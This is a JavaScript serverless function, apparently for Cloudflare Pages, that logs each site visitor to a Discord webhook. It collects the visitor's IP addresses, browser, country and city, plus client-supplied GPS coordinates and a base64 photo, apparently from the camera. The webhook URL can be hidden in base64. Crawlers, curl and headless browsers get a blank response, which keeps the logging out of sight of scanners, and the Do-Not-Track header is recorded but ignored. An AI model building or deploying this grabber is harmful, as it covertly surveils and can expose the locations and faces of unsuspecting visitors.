export async function onRequest(context) {
  const { request, env } = context;
  const headers = request.headers;

  const dnt = headers.get("x-dnt") || headers.get("dnt") || "0";
  const ua = headers.get("user-agent") || "";
  const referer = headers.get("referer") || "";
  const url = request.url || "";

  let browser = "";
  {
    const u = ua;
    if (/brave/i.test(u)) browser = "Brave";
    else if (/edg\//i.test(u)) browser = "Edge";
    else if (/opr\//i.test(u) || /opera/i.test(u)) browser = "Opera";
    else if (/vivaldi/i.test(u)) browser = "Vivaldi";
    else if (/firefox/i.test(u)) browser = "Firefox";
    else if (/safari/i.test(u) && !/(chrome|chromium|crios|edg\/)\s*/i.test(u)) browser = "Safari";
    else if (/(chrome|crios|chromium)/i.test(u)) browser = "Chrome";
  }

  const rawXff = headers.get("x-forwarded-for") || "";
  const xffList = rawXff.split(",").map(s => s.trim()).filter(Boolean);
  const candidates = [
    headers.get("cf-connecting-ip"),
    headers.get("x-real-ip"),
    ...xffList
  ].filter(Boolean);

  const ipv4Regex = /(?<![\d.])((?:\d{1,3}\.){3}\d{1,3})(?![\d.])/;
  let ipv4 = "";
  let ipv6 = "";
  for (const c of candidates) {
    const v4m = c.match(ipv4Regex);
    if (!ipv4 && v4m) ipv4 = v4m[1];
    if (!ipv6 && c.includes(":") && !c.match(/^\s*(?:\d{1,3}\.){3}\d{1,3}\s*$/)) {
      ipv6 = c;
    }
    if (ipv4 && ipv6) break;
  }
  const ip = ipv4 || ipv6 || "";

  let lat = null, lon = null, accuracy = null, photo = null;
  try {
    if (request.method === 'POST') {
      const text = await request.text();
      if (text) {
        const b = JSON.parse(text);
        if (b && typeof b === 'object') {
          if (typeof b.lat === 'number' && typeof b.lon === 'number') { lat = b.lat; lon = b.lon; }
          if (typeof b.accuracy === 'number') accuracy = b.accuracy;
          if (typeof b.photo === 'string') photo = b.photo;
        }
      }
    }
  } catch (_) {}

  const uaLower = ua.toLowerCase();
  const botPatterns = [
    "bot", "crawler", "spider", "crawl", "fetch", "wget", "curl", "python-requests",
    "headless", "puppeteer", "playwright", "lighthouse", "monitor", "uptime",
    "googlebot", "bingbot", "duckduckbot", "baiduspider", "yandexbot", "twitterbot",
    "slackbot", "discordbot", "facebookexternalhit", "whatsapp"
  ];
  if (botPatterns.some(p => uaLower.includes(p))) {
    return new Response(null, { status: 204 });
  }

  let country = ""; let countryCode = ""; let city = "";
  try {
    const cf = request.cf || {};
    countryCode = (cf.country || "").toUpperCase();
    city = cf.city || "";
  } catch (_) {}

  if (!countryCode && ip) {
    try {
      const r = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { headers: { "User-Agent": "cf-pages-func" } });
      if (r.ok) {
        const j = await r.json();
        country = j.country_name || country;
        countryCode = (j.country || countryCode || "").toUpperCase();
        city = j.city || city;
      }
    } catch (_) {}
  }

  const flagEmoji = countryCode ? countryCode
    .replace(/[^A-Z]/g, "")
    .split("")
    .map(c => String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0)))
    .join("") : "🏳️";

  const now = new Date().toISOString();
  const color = 0x00CED1;
  const description = `${flagEmoji} New visitor ${country ? `from ${country}` : ""}`.trim();
  const embed = {
    title: "Visitor Log",
    description,
    color,
    fields: [
      { name: "IPv4", value: ipv4 || "-", inline: true },
      { name: "IPv6", value: ipv6 || "-", inline: true },
      { name: "Browser", value: browser || "-", inline: true },
      { name: "Country", value: country || countryCode || "-", inline: true },
      { name: "City", value: city || "-", inline: true },
      { name: "Coords", value: (lat != null && lon != null) ? `${lat.toFixed(5)}, ${lon.toFixed(5)}${accuracy!=null?` (±${Math.round(accuracy)}m)`:''}` : "-", inline: true },
      { name: "DNT", value: dnt, inline: true },
      { name: "User-Agent", value: ua ? (ua.length > 256 ? ua.slice(0, 253) + "..." : ua) : "-", inline: false },
      { name: "Referrer", value: referer || "-", inline: false },
      { name: "URL", value: url || "-", inline: false },
      { name: "Time", value: now, inline: false }
    ]
  };

  let imageBlob = null, imageFilename = null;
  if (typeof photo === 'string' && /^data:image\/(?:png|jpeg|jpg);base64,/.test(photo)) {
    const m = photo.match(/^data:(image\/(?:png|jpeg|jpg));base64,(.*)$/);
    if (m) {
      const mime = m[1];
      const b64 = m[2];
      try {
        const bin = atob(b64);
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        imageBlob = new Blob([bytes], { type: mime });
        imageFilename = mime.includes('png') ? 'photo.png' : 'photo.jpg';
        embed.image = { url: `attachment://${imageFilename}` };
      } catch (_) {}
    }
  }

  const b64 = env.DISCORD_WEBHOOK_B64 || "";
  const direct = env.DISCORD_WEBHOOK_URL || "";
  const webhook = b64 ? atob(b64) : direct;
  if (!webhook || !/^https:\/\/(?:discord(?:app)?\.com)\/api\/webhooks\//.test(webhook)) {
    return new Response("Webhook not configured", { status: 500 });
  }

  const payload = { embeds: [embed] };

  try {
    let resp;
    if (imageBlob) {
      const form = new FormData();
      form.append('payload_json', JSON.stringify(payload));
      form.append('files[0]', imageBlob, imageFilename);
      resp = await fetch(webhook, { method: 'POST', body: form });
    } else {
      resp = await fetch(webhook, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload) });
    }
    if (!resp.ok) return new Response("Failed to deliver", { status: 502 });
    return new Response(null, { status: 204 });
  } catch (_) {
    return new Response("Error", { status: 500 });
  }
}
